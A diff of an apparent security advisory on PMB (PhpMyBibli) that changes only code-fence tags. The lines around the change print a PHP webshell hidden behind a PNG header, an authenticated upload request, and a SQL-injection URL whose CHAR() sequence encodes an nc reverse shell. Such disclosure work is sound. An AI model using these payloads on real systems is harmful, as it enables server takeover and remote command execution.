@@ -442,7 +442,7 @@ IHDR<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>
 
 The **PHTML** webshell is uploaded through the path **"/camera_upload.php"**. The "data://" scheme is employed to specify both the file type (image/png) and the content encoding (base64).
 
-```http
+```text
 POST /camera_upload.php
 Host: 127.0.0.1
 Cookie: PhpMyBibli-LOGIN=admin; PhpMyBibli-SESSID=
@@ -601,7 +601,7 @@ Since the SQL query is attacker-controlled, as previously stated, manipulation o
 
 The following payload injects a command to send a reverse shell to 127.0.0.1 on port 443.
 
-```http
+```sql
 http://host/pmb/admin/sauvegarde/run.php?sauvegardes[0]=9999%20or%201=1%20union%20select%201,1,1,1,GROUP_CONCAT(CHAR(101,120,116,101,114,110,97,108,58,114,109,32,45,102,32,47,116,109,112,47,102,59,109,107,102,105,102,111,32,47,116,109,112,47,102,59,99,97,116,32,47,116,109,112,47,102,124,47,98,105,110,47,115,104,32,45,105,32,50,62,38,49,124,110,99,32,49,50,55,46,48,46,48,46,49,32,52,52,51,32,62,47,116,109,112,47,102)),1%20LIMIT%201,1
 ```
 
